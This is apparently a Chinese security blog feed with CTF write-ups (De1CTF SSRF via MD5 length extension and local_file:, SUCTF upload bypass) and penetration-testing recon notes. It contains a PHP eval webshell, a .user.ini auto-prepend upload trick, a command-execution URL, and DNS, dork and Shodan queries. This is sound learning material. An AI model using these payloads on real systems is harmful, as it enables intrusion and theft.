class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>​        代码审计能力还有待提高！ 看了很久才把逻辑搞清楚（主要还是对框架，一些函数不太熟悉</p><p>三个路由：</p><ul><li>/     显示源码</li><li>/geneSign  生成md5，sign = md5（secert_key + param + action ）,其中param为url传参，action固定为scan</li><li>/De1ta   挑战，获取cooike中的action参数和sign参数，获取url中的param参数，param参数不能用gopher和file协议。在执行函数Exec中，计算acion和param的Sign，和传入的sign进行比较，相等则继续执行两个判断：action中含有“scan”则会调用urllib.urlopen(param).read()[:50] ，即从url指定地址中创建一个表示远程url的类文件对象（也可以读取本地文件），即可以读取文件内容存入result.txt中；action中含有read可以将result的内容读出来输出前端。</li></ul><h2 id="解法一：md5长度扩展攻击"><a href="#解法一：md5长度扩展攻击" class="headerlink" title="解法一：md5长度扩展攻击"></a>解法一：md5长度扩展攻击</h2><ul><li><p>MD5扩展攻击简单利用（当已知以下三点）：</p><ul><li>md5（salt+message）的值</li><li>message的内容</li><li>salt+message的长度（因为message已知，即只需要知道salt长度即可）</li></ul><p>我们可以在不知道salt的具体内容情况下，计算出任意的md5（salt + message + padding + append）值</p></li><li><p>使用hashpump</p></li></ul><p><img src="2019De1CTF—SSRF-Me/1.png" alt=""></p><p>其中Input Signature是md5（secert_key + ‘flag.txt’+ ‘scan’）的值，secert_key看源码可知是一个长度为16的字符串。</p><p>Input Data 是message，即’scan’</p><p>Input Key Length 是 secert_key+’flag.txt’长度24（相当于固定的一个key的长度），message是scan，为了扩展message</p><p>Input Data to Add: read（message要扩展的内容）</p><p>最终的目标则是获取 <code>md5(secert_key + &#39;flag.txt&#39; + &#39;xxx字符串&#39;)</code> 的值（其中xxx字符串中包含了scan和read）</p><p>最终我们把\x换成%（url编码）构造cookies提交即可得到flag</p><p><img src="2019De1CTF—SSRF-Me/2.png" alt=""></p><p><img src="2019De1CTF—SSRF-Me/3.png" alt=""></p><h2 id="解法二：字符串拼接"><a href="#解法二：字符串拼接" class="headerlink" title="解法二：字符串拼接"></a>解法二：字符串拼接</h2><p>由题意我们只需要得到md5（secert_key+’flag.txt’+’xxx’）的值即可，其中xxx包含了scan 和read。</p><p>我们可以直接在geneSign中传参param=flag.txtread。</p><p>那么此时我们可以得到md5(secert_key+’flag.txt’+’readscan’)的值，正好符合了要求。</p><p>于是在De1ta处传参param=flag.txt, action = readscan ，sign=geneSign得到的值即可</p><p><img src="2019De1CTF—SSRF-Me/4.png" alt=""></p><p><img src="2019De1CTF—SSRF-Me/5.png" alt=""></p><h2 id="解法三：local-file"><a href="#解法三：local-file" class="headerlink" title="解法三：local_file"></a>解法三：local_file</h2><ul><li><p>请求 <code>/geneSign?param=local_file:///app/flag.txtread</code> 获取 md5 值  </p></li><li><p>然后再请求 <code>/De1ta?param=local_file:///app/flag.txt</code> 构造 cookie <code>action=readscan;sign=</code>第一次获取的md5值</p></li><li>和第二种解法本质上相同</li></ul><p>关于 <code>local_file</code> :</p><p>参考：<a href="https://bugs.python.org/issue35907" target="_blank" rel="noopener">https://bugs.python.org/issue35907</a>——CVE-2019-9948——Python 2.x版本至2.7.16版本中的urllib存在安全漏洞，该漏洞源于程序支持local_file: scheme。远程攻击者可利用该漏洞绕过保护机制</p><p>​    这里是使用的 urllib.urlopen(param) 去包含的文件，所以可以直接加上文件路径 <code>flag.txt</code> 或 <code>./flag.txt</code> 去访问，也可以使用类似的 <code>file:///app/flag.txt</code> 去访问，但是 <code>file</code> 关键字在黑名单里，可以使用 <code>local_file</code> 代替</p><p>​    如果使用 urllib2.urlopen(param) 去包含文件就必须加上 <code>file</code> ，否则会报 <code>ValueError: unknown url type: /path/to/file</code> 的错误</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -哈希扩展攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019SUCTF—CheckIn</title>
      <link href="/2019/09/11/2019SUCTF%E2%80%94CheckIn/"/>
      <url>/2019/09/11/2019SUCTF%E2%80%94CheckIn/</url>
      
        <content type="html"><![CDATA[<h1 id="2019SUCTF—CheckIn"><a href="#2019SUCTF—CheckIn" class="headerlink" title="2019SUCTF—CheckIn"></a>2019SUCTF—CheckIn</h1><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>文件上传题，随便传个图片发现回显</p><p><img src="2019SUCTF—CheckIn/2.png" alt=""></p><ul><li>第一个绕过点 &lt;? , 绕过方法 <strong>\<script language='php'>eval($_REQUEST[c]);\</script></strong></li></ul><p>上传一个txt，发现另一种回显</p><p><img src="2019SUCTF—CheckIn/3.png" alt=""></p><ul><li>第二个绕过点exif_imagetype()函数，添加图片文件头即可绕过，如：<code>GIF89a</code></li></ul><p>直接上传php显然是不行的，回显illegal suffix！，判断是个黑名单过滤，尝试fuzz其他php后缀发现也都被过滤了。</p><p>试试改解析，本来想尝试<code>.htaccess</code>（分布式配置文件），无奈题目环境是Nginx</p><p><img src="2019SUCTF—CheckIn/1.png" alt=""></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>捋一下思路：</p><ol><li>黑名单，php脚本无法绕过上传</li><li>存在文件头检查，这个构造图片文件的文件头可绕过</li><li>&lt;?被过滤，用script方式绕过（注意这个在php7不再支持）</li><li>考虑上传图片马，但是不被解析，这里用到了<strong><code>.user.ini</code></strong></li></ol><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p><img src="2019SUCTF—CheckIn/4.png" alt=""></p><p>只要是CGI/FastCGI 运行的php都可以用这个方法。（Nginx采用FastCGI正好符合）</p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p><p>Php配置项中有两个比较有意思的项：</p><p><code>auto_append_file</code>、<code>auto_prepend_file</code></p><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。类似于在index.php中插入一句：<code>require(./01.gif);</code>而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;01.gif</span><br></pre></td></tr></table></figure><p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造<code>.user.ini</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure><p>构造<code>a.jpg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_REQUEST[c]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>上传后访问即可执行命令拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;539c61e5-e2cf-4aed-bd40-c905213d5fb1.node1.buuoj.cn&#x2F;uploads&#x2F;fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;index.php?c&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure><p>参考p神的文章：<a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试学习笔记-弱点扫描(4)</title>
      <link href="/2019/09/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F-4/"/>
      <url>/2019/09/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F-4/</url>
      
        <content type="html"><![CDATA[<h1 id="发现弱点"><a href="#发现弱点" class="headerlink" title="发现弱点"></a>发现弱点</h1><ul><li>发现漏洞<ul><li>基于端口服务扫描结果版本信息（速度慢）</li><li>搜索已公开得漏洞数据库（数量大）<ul><li>exploit-db</li><li>searchsploit  tomcat</li></ul></li><li>使用弱点扫描器实现漏洞管理</li></ul></li></ul><h2 id="弱点扫描类型"><a href="#弱点扫描类型" class="headerlink" title="弱点扫描类型"></a>弱点扫描类型</h2><ul><li>主动扫描<ul><li>有身份验证</li><li>无身份验证</li></ul></li><li>被动扫描<ul><li>镜像端口抓包</li><li>其他来源输入</li></ul></li><li>基于Agent的扫描<ul><li>支持平台有限</li></ul></li></ul><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><ul><li>NMAP扫描脚本<ul><li>位置：/usr/share/nmap/scripts/script.db</li><li>grep vuln /usr/share/nmap/scripts/script.db</li></ul></li><li>扫描结果确认<ul><li>目标系统版本</li><li>补丁是否安装</li><li>是否可被入侵</li></ul></li><li>NMAP使用<ul><li>略</li></ul></li></ul><h2 id="OPENVAS"><a href="#OPENVAS" class="headerlink" title="OPENVAS"></a>OPENVAS</h2><ul><li>Openvas<ul><li>Nessus项目分支</li><li>管理目标系统漏洞</li><li>免费开源</li><li>kali默认安装，但未启动配置<ul><li>openvas-setup  初始化安装</li><li>oepnvas-check-setup  检查安装结果</li><li>openvasmd —list-users   查看当前账号</li><li>openvasmd —user=admin —new-password=Passw0rd</li><li>openvas-feed-update  升级</li></ul></li></ul></li></ul><h2 id="NESSUS"><a href="#NESSUS" class="headerlink" title="NESSUS"></a>NESSUS</h2><ul><li>Win10-家庭版-免费（需fan墙</li><li>linux</li></ul><p>自行下载安装</p><p>略</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试学习笔记-信息收集(3)</title>
      <link href="/2019/09/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3/"/>
      <url>/2019/09/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><ul><li>公开渠道可获得的信息</li><li>与目标系统不产生直接交互</li><li>尽量避免留下一切痕迹</li></ul><h3 id="收集内容"><a href="#收集内容" class="headerlink" title="收集内容"></a>收集内容</h3><ul><li>IP地址段</li><li>域名信息</li><li>邮件地址</li><li>文档图片数据</li><li>公司地址</li><li>公司组织架构</li><li>联系电话/传真号码</li><li>人员姓名/职务</li><li>目标系统使用的技术构架（部分。主要还需要主动方式来收集）</li><li>公开的商业信息</li></ul><h3 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h3><ul><li>用信息描述目标</li><li>发现</li><li>社会工程学攻击</li><li>物理缺口</li></ul><h3 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h3><p><img src="渗透测试学习笔记-信息收集/2.png" alt=""></p><ul><li>域名解析成IP地址<ul><li>域名与FQDN区别 (sina.com 域名  ，  www.sina.com 只是sina.com下的一条主机记录，称为FQDN)</li><li>域名记录：A、C name 、NS、MX、NS</li></ul></li></ul><p>FQDN（全限定域名）：同时带有主机名和域名的名称</p><p>例如：主机名是bigserver,域名是mycompany.com,那么FQDN就是bigserver.mycompany.com。</p><ul><li>A记录：这个域名对应的IPv4地址</li><li>AAAA记录：这个域名对应的IPv6地址</li><li>CNAME记录：该域名指向了另外一个域名，这两个域名都指向同一个ip地址</li><li>PTR记录：被称为指针记录，是A记录的逆向记录，作用是把ip地址解析成域名</li><li>NS记录：NS记录是域名服务器记录，用来指定域名由哪台服务器来进行解析</li><li>MX记录：邮件交换记录，指向这个域的smtp服务器地址</li><li>TXT记录：为域名设置某条记录的说明</li><li>SPF记录：SPF记录是TXT记录的一个运用。后面的备注需要按照指定的格式才能有效。</li></ul><h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><ul><li>nslookup  www.sina.com</li><li>server(server命令设置使用其他DNS服务器。不使用本地运营商提供的DNS服务器)</li><li>type = a、mx、ns、any</li><li>nslookup -type= ns example.com 159.154.70.22</li></ul><p>直接输入nslookup</p><p>> www.sina.com</p><p>或者set type=ns  &lt;==&gt; set q = ns  再查询</p><p>> server 8.8.8.8</p><p>（用不同dns服务器解析可能会对域名解析出不同地址，这种情况经常出现，这是因为互联网大部分网站采用智能DNS，终端用户所处的网络不同，DNS查询的结果可能是不一样的，eg：在北京查询sina.com 返回sina.com域名放置在国内的服务器的地址，在纽约查询则返回sina.com域名放置在美国的服务器的地址，就不会做远距离跨国家出口的访问，为优化互联网流量开发出来的智能功能）</p><p>set q = any 查询出来既有ns记录也会有mx记录，关于域名的所有记录都有</p><p>text记录中的spf记录——用于反垃圾邮件</p><p>（spf记录作用也是将一个ip地址反向解析成对应域名，比如有一个邮件服务器，在上面配置了反垃圾邮件设置，开启反向的域名解析查询，当收到一封邮件的时候，服务器会对来源的地址进行spf记录的反向查询，查询到对应的域名，如果查询到的域名匹配到了发送方”填写”的域名，说明是正确的邮件服务器发来的邮件，匹配不到说明是伪造的域名发来的垃圾邮件）</p><h4 id="DIG"><a href="#DIG" class="headerlink" title="DIG"></a>DIG</h4><ul><li>dig  sina.com  any @8.8.8.8  (只会查sina.com的结果，不会查www.sina.com等其他带有主机名的FQDN的相关记录)</li><li>dig   +noall  +answer  mail.163.com  any   （只输出的answer部分）</li><li>反向查询：dig  -x  220.181.14.157 （其实就是查的ptr记录）</li><li>bind版本信息： dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</li><li>DNS追踪： dig + trace example.com</li></ul><p><strong>补充：</strong></p><ul><li>一个ip可以绑定多个域名</li><li>通常情况下一个域名同一时刻只能对应一个ip。但是在域名服务商那里，你可以把服务器群里面的多个提供相同服务的服务器IP设置一个域名可以轮询。但是同一时刻，一个域名只能解析出一个IP供你使用。这些IP可以轮流着被解析。这些IP其实对应的服务器提供的是同一种的服务。（比如说DNS轮询技术（负载均衡技术）下去查询域名，可以查出多个对应ip）</li><li><strong>DNS轮询技术：</strong>是指将相同的域名解释到不同的IP，随机使用其中某台主机的技术,该项技术可以智能的调整网站的访问量到不同服务器上，减轻网站服务器的压力，实现负载匀衡</li></ul><p><img src="渗透测试学习笔记-信息收集/1.png" alt=""></p><ul><li><p>什么是bind？</p><p>Bind(Berkeley Internet Name Domain Service)，它是一款实现DNS服务器的开放源码软件,够提供双向解析，转发，子域授权，view等功能,是世界上使用最为广泛的DNS服务器软件，目前Internet上半数以上的DNS服务器有都是用Bind来架设的。</p></li><li><p>一个最完美的dns信息收集是给一个域名，查出该域名以及其他FQDN对应的记录信息。变相思路就是渗透到DNS服务器去获取所有信息，通过dig查询bind版本可能可以得到可利用漏洞。（一般查不到..）</p></li><li><p>DNS追踪，绕过本地DNS服务器询问，直接去与根域服务器、com域服务器等进行<strong>迭代查询</strong>，这样就可以在查询过程中发现（com域服务器等）是否地址被改变（是否被劫持）。而直接向本地DNS服务器请求的<strong>递归查询</strong>是发现不了这个问题的。在实际抓包验证中，还是会先向本地DNS查询根域（本机默认是不知道这些根域的地址的），后续也一样的流程，相当于原来是由本地dns服务器做完后续的一切查询最后返回结果，中间过程无法得知。而trace的话是每一次对根域、com域的查询都由客户端DNS发起通过本地DNS为媒介去查询，每一次查询结果缓存在本地DNS中，下一次查询客户端信任本地DNS继续迭代查询。<strong>（递归查询抓包就2个包，trace的迭代查询抓包会出来很多包（如果本地DNS没有缓存的话），详细的迭代查询流程的包）</strong></p></li></ul><h4 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h4><ul><li>dig  @ns2.sina.com   sina.com   axfr   (尝试从ns2.sina.com这台域名服务器中查询出sina.com的域名下的所有主机记录信息，增加攻击面)  （大多情况连接53端口会被拒绝，axfr用的是TCP）</li><li>host -T -l sina.com  ns3.sina.com/ 8.8.8.8等域名服务器 (也是全区域传输查询)</li></ul><h4 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h4><p>区域传输一般很少见，比较常见的方法是DNS字典爆破（爆破某域下的主机名）</p><ul><li>fierce  -dnsserver  8.8.8.8  -dns  sina.com.cn   -wordlist  a.txt   (先会进行区域传输查询，失败则继续字典爆破)</li><li>dnsdict6  -d4  -t 16  -x sina.com     (速度快，字典质量较高)</li><li>dnsenum  -f  dnsbig.txt   -dnsserver  8.8.8.8  sina.com  -o  sina.xml</li><li>dnsmap  sina.com  -w dns.txt  （速度较慢）</li><li>dnsrecon  -d  sina.com  —lifetime  10  -t brt  -D dnsbig.txt  (速度也比较快)</li><li>dnsrecon  -t std -d sina.com  -D  dnsbig.txt</li></ul><p>推荐：dnsdict6 、 dnsrecon 、 fierceb  </p><h4 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h4><ul><li>whois  sina.com</li><li>whois  -h  whois.apnic.net  192.0.43.10</li></ul><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><ul><li>公司新闻动态</li><li>重要雇员信息</li><li>机密文档/网络拓扑</li><li>用户名/密码</li><li>目标系统软硬件技术构架</li></ul><h4 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h4><ul><li>搜索联网设备</li><li>Banner：http、ftp、ssh、telnet</li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li><li>常见filter：<ul><li>net （192.168.20.1）    eg:  net:8.8.8.8</li><li>city</li><li>country（CN、US）</li><li>port  （80、21、22、23）</li><li>os</li><li>Hostname</li><li>server      eg:  server: Apache</li></ul></li></ul><ul><li>200 OK cisco  country:JP</li><li>user:admin pass:password</li><li>linux upnp avtech<ul><li><a href="http://187.208.123.46:9000/" target="_blank" rel="noopener">http://187.208.123.46:9000/</a>    </li><li><a href="http://118.71.214.220:9091/" target="_blank" rel="noopener">http://118.71.214.220:9091/</a></li></ul></li></ul><p><strong>搜索规则：<a href="https://www.shodan.io/explore" target="_blank" rel="noopener">https://www.shodan.io/explore</a></strong></p><h4 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h4><ul><li>+支付 -充值  （含有支付，不含有充值的搜索结果）</li><li>支付 充值（含有支付或者含有充值）  “支付 充值” （就是搜索完整的一串支付充值）</li><li>北京的电子商务公司—— 北京 intitle:电子商务 intext:法人 intext:电话</li><li>阿里网站上的北京公司联系人—— 北京 site:alibaba.com  inurl:contact</li><li>塞班司法案的PDF文档—— SOX filetype:pdf</li><li>法国的支付相关的页面—— payment site:fr</li></ul><p>实例：</p><ul><li>inurl: “level/15/exec/-/show”</li><li>intitle:”netbotz appliance” “ok”     eg: <a href="http://207.150.248.14" target="_blank" rel="noopener">http://207.150.248.14</a></li><li>inurl:/admin/login.php</li><li>inurl:qq.txt</li><li>filetype:xls “username|password”</li><li>inurl:ftp “password” filetype:xls site:baidu.com</li></ul><p><strong>搜索规则：GHDB——<a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></strong></p><h4 id="YANDEX"><a href="#YANDEX" class="headerlink" title="YANDEX"></a>YANDEX</h4><ul><li>世界第四大搜索引擎——俄罗斯</li><li><a href="https://www.yandex.com/" target="_blank" rel="noopener">https://www.yandex.com/</a></li><li>偶尔有惊喜</li></ul><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>​        调用搜索引擎去实现，大量并发去搜索效率高</p><h4 id="theharvester"><a href="#theharvester" class="headerlink" title="theharvester"></a>theharvester</h4><p>邮件、主机</p><ul><li>theharvester  -d sina.com  -l 300 -b google</li></ul><p>文件</p><ul><li>metagoofil -d microsoft.com -t pdf -l 200 -o test -f 1.html</li></ul><h4 id="MELTAGO"><a href="#MELTAGO" class="headerlink" title="MELTAGO"></a>MELTAGO</h4><p>延展性的信息收集工具（图形化界面）</p><ul><li>申请账号</li><li>登录使用</li></ul><h3 id="信息收集——其他途径"><a href="#信息收集——其他途径" class="headerlink" title="信息收集——其他途径"></a>信息收集——其他途径</h3><ul><li>社交网络</li><li>工商注册</li><li>新闻组/论坛</li><li>招聘网站</li><li><a href="http://www.archive.org/web/web.php" target="_blank" rel="noopener">http://www.archive.org/web/web.php</a>  搜索网页的历史版本的页面（快照）</li></ul><h3 id="个人专属密码字典"><a href="#个人专属密码字典" class="headerlink" title="个人专属密码字典"></a>个人专属密码字典</h3><ul><li>按个人信息生成其专属的密码字典</li><li>CUPP——Common  User  Password  Profiler<ul><li>git clone <a href="http://github.com/Mebus/cupp.git" target="_blank" rel="noopener">http://github.com/Mebus/cupp.git</a></li><li>python cup.py  -i</li></ul></li></ul><h3 id="METADATA"><a href="#METADATA" class="headerlink" title="METADATA"></a>METADATA</h3><ul><li>Exif图片信息<ul><li>exiftool  a.jpg</li></ul></li><li>Foca（Windows下图片信息）</li></ul><h3 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h3><ul><li>全特性的web侦察框架、信息搜索框架</li><li>基于python开发</li><li>命令格式与msf一致</li><li>使用方法：<ul><li>模块</li><li>数据库</li><li>报告</li></ul></li></ul><ul><li>recon-ng  -w  sina 进入“新浪”工作区</li><li>框架内help 查看命令</li></ul><h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><ul><li>直接与目标系统交互通信</li><li>无法避免留下访问的痕迹</li><li>使用受控的第三方电脑进行探测<ul><li>使用代理或已经被控制的主机</li><li>做好被封杀的准备</li><li>使用噪声迷惑目标，淹没真实的探测流量</li></ul></li><li>扫描<ul><li>发送不同的探测，根据返回结果判断目标状态（ip层、端口层、服务层）</li></ul></li></ul><h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ul><li>识别活着的主机（不扫描端口）<ul><li>潜在的被攻击目标</li></ul></li><li>输出一个ip地址列表</li><li>2、3、4层发现</li></ul><p><img src="渗透测试学习笔记-信息收集/3.png" alt=""></p><p>​                                                                <strong>OSI理论7层模型（实际大多4-5层）</strong></p><h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><ul><li>优点：扫描速度快、可靠</li><li>缺点：不可路由（大多数情况下）（即只在内网广播）</li><li>Arp协议<ul><li>抓包</li></ul></li></ul><p>（不同内网环境下可以使用的方法可能会受限，多了解）</p><h5 id="arping"><a href="#arping" class="headerlink" title="arping"></a>arping</h5><p>用来发现一个主机ip是否存活在网络里</p><ul><li>arping</li><li>arping 1.1.1.1 -c 1      （发送一个数据包）</li><li>arping 1.1.1.1 -d         （发现重复响应，如果应答从两个不同mac地址发送出来响应同一个ip则中断——发现arp欺骗）（对网关进行检测） </li><li>arping -c 1   1.1.1.1  | grep “bytes from”  | cut  -d “ “ -f 5 |cut -d “(“ -f 2 | cut -d “)” -f 1</li><li>脚本<ul><li>arping1.sh eth0 &gt;addrs</li><li>arping2.sh  addrs</li></ul></li></ul><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><ul><li>nmap 1.1.1.1-254  -sn     （发送arp包，还会有dns反向查询）</li><li>nmap -iL iplist.txt -sn</li></ul><h5 id="Netdiscover"><a href="#Netdiscover" class="headerlink" title="Netdiscover"></a>Netdiscover</h5><ul><li>专用于二层发现</li><li>可用于无线和交换网络环境</li><li>主动和被动探测</li></ul><ul><li>主动<ul><li>netdiscover -i eth0  -r  1.1.1.0/24</li><li>netdiscover -l iplist.txt</li></ul></li></ul><ul><li>被动（混杂模式监听广播包）<ul><li>netdiscover -p</li><li>主动arp容易触发报警</li></ul></li></ul><h5 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h5><ul><li>Scapy<ul><li>作为python库进行调用</li><li>也可以作为单独的工具使用</li><li>抓包、分析、创建、修改、注入网络流量</li></ul></li><li>apt-get install python-gnuplot</li><li>Scapy<ul><li>ARP().display()</li><li>Sr1()</li></ul></li><li>Python脚本编写</li></ul><h4 id="发现——三层发现"><a href="#发现——三层发现" class="headerlink" title="发现——三层发现"></a>发现——三层发现</h4><ul><li>优点<ul><li>可路由</li><li>速度比较快</li></ul></li><li>缺点<ul><li>速度比二层慢</li><li>经常被边界防火墙过滤（造成扫描结果不准确）</li></ul></li><li>IP、icmp协议</li></ul><h5 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h5><ul><li>ping  1.1.1.1 -c 2</li><li>ping -R 1.1.1.1   /   traceroute  1.1.1.1 （通过TTL值从1、2、3开始置起发送ICMP包，每经过一个路由TTL值减1，到0时发送回包，此时获得第n序列的路由器ip，这种方式来获取整个路由路径）</li><li>ping  1.1.1.1 -c 1 | grep “bytes from”  |  cut  -d  “ “ -f 4  |  cut  -d “:”  -f 1</li><li>脚本实现（scapy）（略）</li></ul><h5 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h5><ul><li>nmap  -sn  1.1.1.1-255  